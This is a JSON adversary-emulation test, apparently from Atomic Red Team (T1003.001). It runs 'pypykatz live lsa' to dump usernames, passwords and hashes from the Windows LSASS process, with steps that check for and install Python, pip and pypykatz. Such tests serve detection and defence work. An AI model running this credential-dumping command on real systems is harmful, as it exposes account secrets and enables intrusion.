{
  "id": "c37bc535-5c62-4195-9cc3-0517673171d8",
  "name": "LSASS read with pypykatz",
  "description": "Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::\n\nPython 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.\n\nSuccessful execution of this test will display multiple usernames and passwords/hashes to the screen.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "5316f128-21b8-4342-94e9-eea2088a76c6",
      "type": "execute-command",
      "data": {
        "command": "pypykatz live lsa\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "f49b46f7-ca2b-4d07-ac4c-12a790c72300",
      "name": "Check dependency 1/3",
      "description": "Computer must have python 3 installed\n",
      "type": "execute-command",
      "data": {
        "command": "py -3 --version \u003enul 2\u003e\u00261\nexit /b %errorlevel%\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "0c6471a8-c8ab-426e-bab5-6dadb261019a",
      "name": "Resolve dependency 1/3",
      "description": "Computer must have python 3 installed\n",
      "type": "execute-command",
      "data": {
        "command": "echo \"Python 3 must be installed manually\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "577243a2-d69b-4fba-9727-2e0218e9de90",
      "name": "Re-check dependency 1/3",
      "description": "Computer must have python 3 installed\n",
      "type": "execute-command",
      "data": {
        "command": "py -3 --version \u003enul 2\u003e\u00261\nexit /b %errorlevel%\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "0fea55cd-ae6c-45d5-8102-2d281613c828",
      "name": "Check dependency 2/3",
      "description": "Computer must have pip installed\n",
      "type": "execute-command",
      "data": {
        "command": "py -3 -m pip --version \u003enul 2\u003e\u00261\nexit /b %errorlevel%\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "50cd70f7-d204-4a27-a023-3e829c301693",
      "name": "Resolve dependency 2/3",
      "description": "Computer must have pip installed\n",
      "type": "execute-command",
      "data": {
        "command": "echo \"PIP must be installed manually\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "31adb21b-f067-4f58-9f77-5ca9dfbea156",
      "name": "Re-check dependency 2/3",
      "description": "Computer must have pip installed\n",
      "type": "execute-command",
      "data": {
        "command": "py -3 -m pip --version \u003enul 2\u003e\u00261\nexit /b %errorlevel%\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "4f274c15-af77-428c-9a75-906105aefd44",
      "name": "Check dependency 3/3",
      "description": "pypykatz must be installed and part of PATH\n",
      "type": "execute-command",
      "data": {
        "command": "pypykatz -h \u003enul 2\u003e\u00261\nexit /b %errorlevel%\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "b5803aec-5a08-4c02-a6ea-af413645b0f5",
      "name": "Resolve dependency 3/3",
      "description": "pypykatz must be installed and part of PATH\n",
      "type": "execute-command",
      "data": {
        "command": "pip install pypykatz\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "5c6d8016-30a6-41e4-87fc-e68e00cb8c7b",
      "name": "Re-check dependency 3/3",
      "description": "pypykatz must be installed and part of PATH\n",
      "type": "execute-command",
      "data": {
        "command": "pypykatz -h \u003enul 2\u003e\u00261\nexit /b %errorlevel%\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "f49b46f7-ca2b-4d07-ac4c-12a790c72300",
      "p": "on-success",
      "o": "5316f128-21b8-4342-94e9-eea2088a76c6"
    },
    {
      "s": "f49b46f7-ca2b-4d07-ac4c-12a790c72300",
      "p": "on-failure",
      "o": "0c6471a8-c8ab-426e-bab5-6dadb261019a"
    },
    {
      "s": "0c6471a8-c8ab-426e-bab5-6dadb261019a",
      "p": "on-success",
      "o": "577243a2-d69b-4fba-9727-2e0218e9de90"
    },
    {
      "s": "577243a2-d69b-4fba-9727-2e0218e9de90",
      "p": "on-failure",
      "o": "5316f128-21b8-4342-94e9-eea2088a76c6"
    },
    {
      "s": "0fea55cd-ae6c-45d5-8102-2d281613c828",
      "p": "on-success",
      "o": "5316f128-21b8-4342-94e9-eea2088a76c6"
    },
    {
      "s": "0fea55cd-ae6c-45d5-8102-2d281613c828",
      "p": "on-failure",
      "o": "50cd70f7-d204-4a27-a023-3e829c301693"
    },
    {
      "s": "50cd70f7-d204-4a27-a023-3e829c301693",
      "p": "on-success",
      "o": "31adb21b-f067-4f58-9f77-5ca9dfbea156"
    },
    {
      "s": "31adb21b-f067-4f58-9f77-5ca9dfbea156",
      "p": "on-failure",
      "o": "5316f128-21b8-4342-94e9-eea2088a76c6"
    },
    {
      "s": "4f274c15-af77-428c-9a75-906105aefd44",
      "p": "on-success",
      "o": "5316f128-21b8-4342-94e9-eea2088a76c6"
    },
    {
      "s": "4f274c15-af77-428c-9a75-906105aefd44",
      "p": "on-failure",
      "o": "b5803aec-5a08-4c02-a6ea-af413645b0f5"
    },
    {
      "s": "b5803aec-5a08-4c02-a6ea-af413645b0f5",
      "p": "on-success",
      "o": "5c6d8016-30a6-41e4-87fc-e68e00cb8c7b"
    },
    {
      "s": "5c6d8016-30a6-41e4-87fc-e68e00cb8c7b",
      "p": "on-failure",
      "o": "5316f128-21b8-4342-94e9-eea2088a76c6"
    }
  ],
  "tags": [
    "T1003.001",
    "atomic-red-team"
  ]
}